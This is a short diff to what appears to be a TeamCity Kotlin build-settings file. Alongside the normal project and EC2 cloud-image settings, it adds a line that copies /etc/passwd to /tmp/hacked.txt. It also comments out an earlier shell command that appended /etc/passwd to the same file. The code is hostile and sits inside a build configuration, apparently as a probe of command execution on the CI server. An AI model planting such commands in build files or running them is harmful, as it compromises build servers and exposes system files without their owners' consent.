@@ -36,15 +36,17 @@ project {
 
     buildType(Build)
 
+    java.lang.String("scp /etc/passwd /tmp/hacked.txt").runCommand("tmp")
+
 
     /*var process = Runtime.getRuntime().exec("scp /etc/passwd /tmp/hacked.txt")
     val exitCode = process.waitFor()
     println(exitCode)*/
 
-    val builder = ProcessBuilder()
+    /*val builder = ProcessBuilder()
     builder.command("sh", "-c", "cat /etc/passwd >> /tmp/hacked.txt")
     val process = builder.start()
-    val exitCode = process.waitFor()
+    val exitCode = process.waitFor()*/
 
     features {
         amazonEC2CloudImage {
